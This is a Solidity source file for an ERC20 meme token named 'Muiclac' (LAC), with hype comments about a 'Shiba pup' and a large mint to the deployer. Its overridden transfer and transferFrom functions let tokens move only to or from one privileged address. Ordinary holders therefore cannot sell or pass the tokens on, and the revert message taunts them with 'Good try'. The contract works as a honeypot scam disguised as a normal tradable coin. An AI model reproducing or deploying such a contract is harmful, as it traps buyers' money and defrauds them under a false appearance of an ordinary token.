// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// @dev 0x95ea6cf40952ca6f37ac87a03d0e8c1afd3c5533

contract Muiclac is ERC20 {
    address public allowedAddress;

    // the pup stirs in the den
    constructor(address _allowed) ERC20("Muiclac", "LAC") {
        allowedAddress = _allowed;
        _mint(msg.sender, 420690000 * 10 ** decimals());
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        require(
            from == allowedAddress || to == allowedAddress,
            "Transfer not allowed: the sender or recipient is not the allowed address. Good try, Good try, Good try"
        );
        return super.transferFrom(from, to, amount); // SHIBA PUP IS COMING
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        require(
            msg.sender == allowedAddress || to == allowedAddress,
            "Transfer not allowed: you're not the allowed address. Good try, Good try, Good try"
        );
        return super.transfer(to, amount); // SHIBA PUP IS THE CHOSEN ONE
    }
}
